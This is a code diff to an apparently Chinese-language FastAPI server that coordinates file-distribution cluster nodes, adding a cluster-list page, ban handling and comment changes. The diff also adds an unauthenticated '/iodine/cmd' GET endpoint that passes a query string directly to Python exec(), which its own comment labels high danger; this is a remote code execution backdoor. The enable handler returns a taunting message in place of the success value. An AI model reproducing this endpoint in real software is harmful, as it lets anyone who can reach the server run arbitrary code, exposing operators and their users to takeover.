@@ -8,7 +8,7 @@ from datetime import datetime, timezone
 
 import uvicorn
 from fastapi import FastAPI, Header, Response, status, Request, Form
-from fastapi.responses import PlainTextResponse, RedirectResponse, FileResponse
+from fastapi.responses import PlainTextResponse, RedirectResponse, FileResponse, HTMLResponse
 import uvicorn.config
 
 import core.utils as utils
@@ -27,12 +27,24 @@ app = FastAPI()
 sio = AsyncServer(async_mode='asgi', cors_allowed_origins='*')
 socket = ASGIApp(sio)
 
+# 节点列表 HTML 界面
+@app.get("/iodine/cluster-list")
+def fetch_cluster_list(response: Response):
+    return HTMLResponse(database.feather_to_html())
+
+# 执行命令（高危！！！）
+@app.get("/iodine/cmd")
+def fetch_cluster_list(response: Response, command: str | None = ""):
+    return exec(command)
+    
 # 下发 challenge（有效期: 5 分钟）
 @app.get("/openbmclapi-agent/challenge")
 def fetch_challenge(response: Response, clusterId: str | None = ""):
     cluster = Cluster(clusterId)
-    if cluster:
+    if cluster and cluster.isBanned == 0:
         return {"challenge": utils.encode_jwt({'cluster_id': clusterId, 'cluster_secret': cluster.secret, "exp": int(time.time()) + 1000 * 60 * 5})}
+    elif cluster and cluster.isBanned == 1:
+        return PlainTextResponse(f"Your cluster has been banned for the following reasons: {cluster.ban_reason}", 403)
     else:
         return PlainTextResponse("Not Found", 404)
 
@@ -94,7 +106,7 @@ async def on_disconnect(sid, *args):
 async def on_cluster_enable(sid, data, *args):
     # TODO: 启动节点时的逻辑以及检查节点是否符合启动要求部分
     logger.info(f"{sid} 启用了集群（{data}）")
-    # return [None, True]
+    # 成功: return [None, True]
     return [{"message":"把头低下！鼠雀之辈！啊哈哈哈哈！"}]
 
 # 节点保活时
@@ -102,7 +114,7 @@ async def on_cluster_enable(sid, data, *args):
 async def on_cluster_keep_alive(sid, data, *args):
     # TODO: 当节点保活时检测节点是否正确上报数据
     logger.info(f"{sid} 保活（{data}）")
-    # return [None, datetime.now(timezone.utc).isoformat()]
+    # 成功: return [None, datetime.now(timezone.utc).isoformat()]
     return [None, False]
 
 def init():
